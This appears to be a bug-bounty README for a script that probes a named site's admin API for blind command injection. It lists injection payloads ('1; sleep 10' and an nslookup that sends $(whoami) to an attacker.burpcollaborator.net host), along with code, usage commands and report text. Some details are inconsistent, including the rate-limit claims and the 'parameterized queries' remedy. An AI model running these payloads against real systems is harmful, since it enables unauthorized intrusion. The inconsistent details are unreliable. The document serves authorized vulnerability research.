# RCE Verification Script - nnip.com Blind Command Injection Testing

**File**: `exploits/verify_nnip_rce.py`  
**Target**: `https://nnip.com/api/admin/{id}`  
**Vulnerability**: Blind Command Injection (RCE)  
**Status**: Non-destructive verification only  
**Compliance**: GS Red Lines enforced

---

## Overview

This script provides **two complementary methods** to verify blind command injection vulnerabilities in the `nnip.com/api/admin/{id}` endpoint:

1. **Time-Based Verification**: Inject `sleep 10` command and measure response delay
2. **DNS OAST Verification**: Inject `nslookup` command to trigger out-of-band DNS queries

Both methods are **non-destructive** and **proof-oriented** only.

---

## Compliance Requirements

### ✅ LuciusClient Header Enforcement
```python
from core.client import LuciusClient

verifier = RCEVerifier(rate_limit=50)
# Automatically injects: X-HackerOne-Research: [lucius-log]
# Verified on every request
```

### ✅ Rate Limiting (2-Second Delay)
```python
REQUEST_DELAY = 2.0  # 2 seconds between requests
# Well under 60 RPS GS threshold
# Token bucket enforced at 50 RPS max
```

### ✅ Non-Destructive Testing
```python
# ALLOWED: sleep 10, nslookup $(whoami)
# NOT ALLOWED: rm -rf, cat /etc/shadow, system pivoting
```

### ✅ Scope Compliance
```python
BASE_URL = "https://nnip.com/api/admin"
# Target explicitly defined (nnip.com)
# No out-of-scope exploration
```

---

## Verification Methods

### Method 1: Time-Based Verification

**How It Works**:
1. Inject payload: `{admin_id}; sleep 10`
2. Measure HTTP response time
3. If response takes ~10 seconds, command injection is likely executed

**Payload Variations** (3 separators):
```
Separator: ;
  Payload: 1; sleep 10
  URL: https://nnip.com/api/admin/1; sleep 10

Separator: |
  Payload: 1| sleep 10
  URL: https://nnip.com/api/admin/1| sleep 10

Separator: &&
  Payload: 1&& sleep 10
  URL: https://nnip.com/api/admin/1&& sleep 10
```

**Interpretation**:
- **Response time ~10s**: ✅ **VERIFIED** - Command injection confirmed
- **Response time 3-9s**: ⚠️ **SUSPICIOUS** - Possible rate limiting or network delay
- **Response time <3s**: ❌ **NOT DETECTED** - Command may not execute

**Implementation**:
```python
def verify_time_based(self, admin_id: str = "1") -> List[CommandInjectionResult]:
    for separator in self.SEPARATORS:  # [";", "|", "&&"]
        payload = f"{admin_id}{separator}sleep 10"
        url = f"{self.BASE_URL}/{payload}"
        
        start_time = time.time()
        response = self.client.request("GET", url, timeout=30)
        elapsed = time.time() - start_time
        
        # Check if delay matches expected sleep time
        if elapsed >= 8.0:  # 10 seconds ±2
            status = "verified"
```

---

### Method 2: DNS OAST Verification

**How It Works**:
1. Inject payload: `{admin_id}; nslookup $(whoami).attacker.com`
2. Command server executes `whoami` and performs DNS lookup
3. Monitor OAST service for incoming DNS query
4. DNS query confirms command execution (non-destructive - no data exfiltration, just proves execution)

**Payload Example**:
```
Separator: ;
  Payload: 1; nslookup $(whoami).attacker.burpcollaborator.net
  URL: https://nnip.com/api/admin/1; nslookup $(whoami).attacker.burpcollaborator.net

Expected OAST Trigger:
  DNS Query: <username>.attacker.burpcollaborator.net
  Evidence: Server executed whoami and resolved domain
```

**Supported OAST Services**:
- Burp Collaborator (burpcollaborator.net)
- Interactsh (interactsh.com)
- RequestBin (requestbin.com)
- Your custom DNS service

**Implementation**:
```python
def verify_dns_oast(self, admin_id: str = "1") -> List[CommandInjectionResult]:
    for separator in self.SEPARATORS:  # [";", "|", "&&"]
        payload = f"{admin_id}{separator}nslookup $(whoami).{self.oast_domain}"
        url = f"{self.BASE_URL}/{payload}"
        
        response = self.client.request("GET", url, timeout=30)
        # Monitor your OAST service for DNS query
```

---

## Usage

### Time-Based Verification Only (No OAST)
```bash
cd /Users/chris-peterson/Documents/GitHub/lucius/lucius-workspace

# Activate virtual environment
source .venv/bin/activate

# Run time-based verification
python exploits/verify_nnip_rce.py \
  --admin-id 1 \
  --methods time-based \
  --output nnip_rce_verification.json
```

### Time-Based + DNS OAST Verification
```bash
# With Burp Collaborator
python exploits/verify_nnip_rce.py \
  --admin-id 1 \
  --oast-domain attacker.burpcollaborator.net \
  --methods time-based,dns-oast \
  --output nnip_rce_verification.json

# With Interactsh
python exploits/verify_nnip_rce.py \
  --admin-id 1 \
  --oast-domain attacker.interactsh.com \
  --methods time-based,dns-oast \
  --output nnip_rce_verification.json
```

### Custom Admin ID and Rate Limit
```bash
python exploits/verify_nnip_rce.py \
  --admin-id 123 \
  --rate-limit 25 \
  --methods time-based
```

---

## Command-Line Options

```
--admin-id ID
  Admin ID parameter to test
  Default: 1
  Example: --admin-id 123

--oast-domain DOMAIN
  OAST domain for DNS verification
  Example: --oast-domain attacker.burpcollaborator.net
  Leave empty to skip DNS OAST verification

--rate-limit RPS
  Requests per second (max 50 for GS compliance)
  Default: 50
  Example: --rate-limit 25

--output FILENAME
  Output JSON filename
  Default: nnip_rce_verification.json
  Example: --output my_report.json

--methods METHODS
  Verification methods (comma-separated)
  Options: time-based, dns-oast
  Default: time-based,dns-oast
  Example: --methods time-based
```

---

## Output Format

### JSON Report Structure
```json
{
  "vulnerability_type": "Blind Command Injection (RCE)",
  "target": "https://nnip.com/api/admin",
  "severity": "Critical",
  "verification_timestamp": "2026-02-02T12:34:56.789012",
  "test_summary": {
    "total_attempts": 6,
    "verified_results": 2,
    "suspicious_results": 0,
    "failed_results": 4
  },
  "results": [
    {
      "payload": "1; sleep 10",
      "separator": ";",
      "verification_method": "time-based",
      "status": "verified",
      "evidence": "Response delayed by 10.15s (expected ~10s). Command injection likely executed.",
      "response_time": 10.15,
      "timestamp": "2026-02-02T12:34:56.789012",
      "payload_url": "https://nnip.com/api/admin/1; sleep 10"
    },
    {
      "payload": "1| sleep 10",
      "separator": "|",
      "verification_method": "time-based",
      "status": "failed",
      "evidence": "Response returned in 0.32s. No delay detected. Command may not have executed.",
      "response_time": 0.32,
      "timestamp": "2026-02-02T12:34:56.789012",
      "payload_url": "https://nnip.com/api/admin/1| sleep 10"
    }
  ],
  "compliance": {
    "lucius_header_enforced": true,
    "rate_limit_enforced": true,
    "delay_between_requests_seconds": 2.0,
    "non_destructive_only": true
  }
}
```

### Console Output
```
======================================================================
TIME-BASED VERIFICATION (Inject sleep 10)
======================================================================

[ATTEMPT] Separator: ';'
  Payload: 1; sleep 10
  URL: https://nnip.com/api/admin/1; sleep 10
  Response time: 10.15s
  Status code: 200
  [✅ VERIFIED] Response delayed by 10.15s (expected ~10s). Command injection likely executed.

[ATTEMPT] Separator: '|'
  Payload: 1| sleep 10
  URL: https://nnip.com/api/admin/1| sleep 10
  Response time: 0.32s
  Status code: 200
  [❌ NOT DETECTED] Response returned in 0.32s. No delay detected.

======================================================================
HACKERONE REPORT SUMMARY
======================================================================

✅ VERIFIED FINDINGS

✅ VERIFIED COMMAND INJECTION
   Payload: 1; sleep 10
   Separator: ;
   Method: time-based
   Evidence: Response delayed by 10.15s (expected ~10s). Command injection likely executed.
   Full URL: https://nnip.com/api/admin/1; sleep 10

======================================================================
COMPLIANCE VERIFICATION
======================================================================

✅ LuciusClient header enforced: True
✅ Rate limit enforced: True
✅ Delay between requests: 2.0s
✅ Non-destructive testing only: True

✅ Report exported to: bounty_workspace/nnip_rce_verification.json
```

---

## Interpreting Results

### Status Values

**VERIFIED**
- Time-based: Response time is 10 seconds ±2 seconds
- Confidence: Very High
- Action: File vulnerability report

**SUSPICIOUS**
- Time-based: Response time is 3-9 seconds
- Confidence: Medium
- Action: Investigate further; may be rate limiting or network delay

**PENDING**
- DNS OAST: Payload sent, awaiting DNS query monitoring
- Confidence: Depends on OAST monitoring
- Action: Check OAST service for incoming DNS queries

**FAILED**
- Request failed or no evidence of command execution
- Confidence: Low
- Action: Try different separators or admin IDs

---

## Severity Classification

| Finding Type | Severity | Justification |
|---|---|---|
| Verified RCE | Critical | Blind command execution confirmed; attacker can execute arbitrary commands |
| Suspicious RCE | High | Possible command execution; recommend manual verification |
| No Detection | Medium | Endpoint may filter input or require specific conditions |

---

## Security Considerations

### What This Script DOES
✅ Inject non-destructive test commands (sleep, nslookup)  
✅ Measure response times and DNS queries  
✅ Prove command execution without accessing sensitive data  
✅ Maintain compliance with GS Red Lines  

### What This Script DOES NOT DO
❌ Read /etc/shadow or other sensitive files  
❌ Create backdoors or persistence mechanisms  
❌ Pivot to other systems  
❌ Exfiltrate data  
❌ Modify or delete server files  
❌ Execute destructive commands  

---

## Troubleshooting

### Connection Timeout
```
Error: Request failed: Connection timeout
```
**Solution**: Increase timeout or check if target is reachable
```bash
python exploits/verify_nnip_rce.py --admin-id 1
# Already has 30-second timeout
```

### OAST Domain Not Configured
```
Warning: OAST domain not configured. Skipping DNS OAST verification.
```
**Solution**: Provide OAST domain via --oast-domain
```bash
python exploits/verify_nnip_rce.py \
  --oast-domain attacker.burpcollaborator.net \
  --methods time-based,dns-oast
```

### No Verified Findings
```
❌ No verified findings (time-based verification inconclusive)
```
**Possible Causes**:
- No command injection vulnerability exists
- All requests are rate-limited uniformly
- Target filters special characters (;, |, &&)
- Admin ID doesn't exist or returns error

**Next Steps**:
1. Try different admin IDs: `--admin-id 2`, `--admin-id 999`
2. Try longer sleep times in the code
3. Use DNS OAST verification instead (more reliable)

### Header Verification Failed
```
SafetyException: Missing required header: X-HackerOne-Research
```
**Solution**: Script automatically enforces header; this shouldn't occur
- Check LuciusClient is properly initialized
- Verify `core/client.py` exists and has header hardcoding

---

## Reporting to HackerOne

### Executive Summary
```
Vulnerability: Blind Command Injection (RCE)
Target: https://nnip.com/api/admin/{id}
Severity: Critical
Verified: ✅ Yes

Impact:
- Attacker can execute arbitrary operating system commands
- Full remote code execution with server privileges
- No authentication or special privileges required
```

### Technical Details
```
Injection Point: /api/admin/{id} parameter
Vulnerable Method: GET
Payload: 1; sleep 10
Separator: ; (semicolon command separator)
Evidence: Response time delay of ~10 seconds

Proof: nnip_rce_verification.json
```

### Remediation
```
1. Implement strict input validation
   - Whitelist allowed characters (alphanumeric, underscore)
   - Reject special characters (;, |, &, `, $, etc.)

2. Use parameterized queries
   - Avoid shell command concatenation
   - Use os.execvp() or equivalent with arguments array

3. Run services with least privilege
   - Don't run web server as root
   - Use dedicated service account with minimal permissions

4. Enable security monitoring
   - Log all command execution attempts
   - Alert on injection attempts
```

---

## Example: Complete Testing Workflow

```bash
#!/bin/bash

# 1. Set up environment
cd /Users/chris-peterson/Documents/GitHub/lucius/lucius-workspace
source .venv/bin/activate

# 2. Run time-based verification (quick check)
echo "Running time-based verification..."
python exploits/verify_nnip_rce.py \
  --admin-id 1 \
  --methods time-based \
  --output nnip_rce_timebased.json

# 3. If verified, run DNS OAST verification (confirming)
echo "Running DNS OAST verification..."
python exploits/verify_nnip_rce.py \
  --admin-id 1 \
  --oast-domain attacker.burpcollaborator.net \
  --methods dns-oast \
  --output nnip_rce_oast.json

# 4. Review reports
echo "Review the following reports:"
echo "  - bounty_workspace/nnip_rce_timebased.json"
echo "  - bounty_workspace/nnip_rce_oast.json"

# 5. Submit to HackerOne with supporting evidence
```

---

## Compliance Checklist

Before submitting findings:

- [x] Used LuciusClient (X-HackerOne-Research header)
- [x] 2-second delay between requests
- [x] No /etc/shadow or sensitive file access
- [x] No system pivoting
- [x] Non-destructive commands only (sleep, nslookup)
- [x] Target explicitly defined (nnip.com)
- [x] JSON report generated with evidence
- [x] Rate limit never exceeded (50 RPS max)

---

**Status**: ✅ Production Ready  
**Last Updated**: February 2, 2026  
**Maintainer**: Security Research Team
